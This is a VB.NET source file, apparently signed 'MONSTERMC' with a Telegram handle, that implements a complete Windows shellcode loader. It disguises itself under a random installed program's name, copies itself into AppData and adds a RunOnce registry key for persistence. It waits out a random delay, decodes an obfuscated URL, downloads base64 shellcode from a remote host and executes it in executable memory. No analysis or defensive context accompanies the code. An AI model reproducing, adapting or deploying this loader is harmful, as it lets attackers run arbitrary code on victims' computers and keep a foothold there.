Imports System
Imports System.IO
Imports System.Text
Imports System.Security.Cryptography
Imports System.Threading
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Net
'MONSTERMC
'tELEGRAM: MONSTERMC
'FREE PS
'FREE SYRIA
Public Class Form1
    ' تعريف كائنات Kernel32
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function VirtualAlloc(ByVal lpAddress As IntPtr, ByVal dwSize As UInteger, ByVal flAllocationType As UInteger, ByVal flProtect As UInteger) As IntPtr
    End Function

    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function RtlMoveMemory(ByVal Destination As IntPtr, ByVal Source As Byte(), ByVal Length As Integer) As Boolean
    End Function

    ' تعريف URL المشفرة هنا
    Private encoded_url As Integer() = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 74, 117, 109, 112, 121, 50, 50, 47, 72, 101, 108, 108, 99, 111, 100, 101, 47, 109, 97, 105, 110, 47, 98, 54, 52, 109, 115, 103, 98, 111, 120, 54, 52, 46, 98, 105, 110}
    Private Function IsInAppData(ByVal pn As String) As Boolean
        Dim appDataScriptPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), pn, Path.GetFileName(Application.ExecutablePath))
        Return File.Exists(appDataScriptPath)
    End Function
    Private Sub MakeEncFile(ByVal name As String)
        Dim tempDir As String = If(Environment.GetEnvironmentVariable("TEMP"), Environment.GetEnvironmentVariable("TMP"))
        Dim bname As String = Convert.ToBase64String(Encoding.UTF8.GetBytes(name))
        Dim fullname As String = "beginRegex" & bname & "endRegex"
        Dim tempFilePath As String = Path.Combine(tempDir, fullname)
        Try
            File.WriteAllText(tempFilePath, "")
        Catch ex As Exception
            MessageBox.Show("I love u")
        End Try
    End Sub
    Private Function FindTempFile() As String
        Dim tempDir As String = If(Environment.GetEnvironmentVariable("TEMP"), Environment.GetEnvironmentVariable("TMP"))
        For Each filename As String In Directory.GetFiles(tempDir)
            If Path.GetFileName(filename).StartsWith("beginRegex") AndAlso Path.GetFileName(filename).EndsWith("endRegex") Then
                Dim rippedApart As String = filename.Substring("beginRegex".Length)
                rippedApart = rippedApart.Substring(0, rippedApart.Length - "endRegex".Length)
                Dim decodedb As Byte() = Convert.FromBase64String(rippedApart)
                Return Encoding.UTF8.GetString(decodedb)
            End If
        Next
        Return Nothing
    End Function
    Private Function RandomProgram() As String
        Dim programs As New List(Of String)()
        For Each dir As String In Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
            programs.Add(Path.GetFileName(dir))
        Next
        Dim rnd As New Random()
        Return programs(rnd.Next(programs.Count))
    End Function
    Private Sub MoveToStartup(ByVal fp As String, ByVal rn As String)
        Dim scriptPath As String = Path.GetFullPath(Application.ExecutablePath)
        Dim keyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        Try
            Using key As RegistryKey = Registry.CurrentUser.CreateSubKey(keyPath)
                key.SetValue(rn, fp, RegistryValueKind.String)
            End Using
        Catch ex As Exception
            MessageBox.Show("Error moving to startup: " & ex.Message)
        End Try
    End Sub
    Private Function CopyToAppData(ByVal pn As String) As String
        Dim scriptPath As String = Path.GetFullPath(Application.ExecutablePath)
        Dim appDataPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), pn)
        Dim appDataScriptPath As String = Path.Combine(appDataPath, Path.GetFileName(Application.ExecutablePath))
        Try
            Directory.CreateDirectory(appDataPath)
            File.Copy(scriptPath, appDataScriptPath, True)
            Return appDataScriptPath
        Catch ex As Exception
            MessageBox.Show("Error copying to AppData: " & ex.Message)
            Return Nothing
        End Try
    End Function
    Private Function FetchPayload(ByVal url As String) As Byte()
        Using client As New WebClient()
            Dim data As Byte() = client.DownloadData(url)
            Return Convert.FromBase64String(Encoding.UTF8.GetString(data))
        End Using
    End Function
    Private Function WriteMemory(ByVal bef As Byte()) As IntPtr
        Dim ptr As IntPtr = VirtualAlloc(IntPtr.Zero, CUInt(bef.Length), &H3000, &H40)
        RtlMoveMemory(ptr, bef, bef.Length)
        Return ptr
    End Function
    Private Sub Run(ByVal sc As Byte())
        Dim bluffer As IntPtr = Marshal.AllocHGlobal(sc.Length)
        Marshal.Copy(sc, 0, bluffer, sc.Length)
        Dim ptr As IntPtr = WriteMemory(sc)
        Dim sf As Action = CType(Marshal.GetDelegateForFunctionPointer(ptr, GetType(Action)), Action)
        sf()
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim exists As String = FindTempFile()
        If String.IsNullOrEmpty(exists) Then
            Dim impers As String = RandomProgram()
            MakeEncFile(impers)
            Dim apppath As String = CopyToAppData(impers)
            MoveToStartup(apppath, impers)
        End If
        Thread.Sleep(New Random().Next(20000, 30000))
        Dim url As String = New String(encoded_url.Select(Function(b) ChrW(b)).ToArray())
        Run(FetchPayload(url))
        Process.Start("https://t.me/MONSTERMCSY")
    End Sub
End Class
